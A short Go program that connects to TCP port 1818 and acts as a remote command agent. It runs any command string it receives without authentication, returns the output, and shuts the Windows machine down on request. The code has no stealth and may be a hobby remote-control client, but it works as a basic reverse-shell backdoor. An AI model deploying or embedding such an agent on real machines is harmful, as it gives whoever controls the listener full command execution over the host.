package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func exeCmd(cmd string) string {
	parts := strings.Split(cmd, " ")
	fmt.Println(parts)
	head := parts[0]
	parts = parts[1:]

	out, err := exec.Command(head, parts...).Output()
	if err != nil {
		fmt.Printf("%s", err)
	}
	return string(out)
}

func turnOff() {
	fmt.Println("Turning off computer")
	exeCmd("shutdown -s -t 0")
}

func executeCommand(command string) (stdout string) {
	stdout = exeCmd(command)
	return
}

type packet struct {
	isShutdown bool
	msg        string
}

func main() {
	var conn net.Conn
	var err error
	fmt.Println("Connecting ...")
	for {
		conn, err = net.Dial("tcp", ":1818")
		if err == nil {
			break
		}
	}
	fmt.Println("Connected")

	data := make([]byte, 65000)

	for {
		n, err := conn.Read(data)
		if err != nil {
			fmt.Println("Disconnect")
			for {
				fmt.Println("Reconnecting ...")
				conn, err = net.Dial("tcp", ":1818")
				if err == nil {
					fmt.Println("Reconnected")
					break
				}
			}
		}

		var msg map[string]interface{}

		json.Unmarshal(data[:n], &msg)
		fmt.Println(msg)
		if msg["is_shutdown"].(bool) {
			turnOff()
		} else {
			result := executeCommand(msg["msg"].(string))
			conn.Write([]byte(result))
		}
	}

}
